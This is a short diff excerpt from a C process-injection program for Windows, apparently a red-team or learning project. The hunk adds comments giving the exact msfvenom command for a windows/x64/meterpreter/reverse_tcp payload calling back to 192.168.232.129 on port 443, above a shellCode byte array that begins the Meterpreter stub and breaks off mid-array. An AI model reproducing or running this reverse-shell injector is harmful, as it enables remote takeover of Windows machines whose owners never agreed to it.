@@ -15,6 +15,8 @@ DWORD PID;
 HANDLE hProcess = NULL;
 HANDLE hThread = NULL;
 LPVOID rBuffer = NULL;
+// Exact command I used to make the shell code
+// msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.129 LPORT=443 EXITFUNC=thread -f c --var-name=shellCode     
 unsigned char shellCode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
 "\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
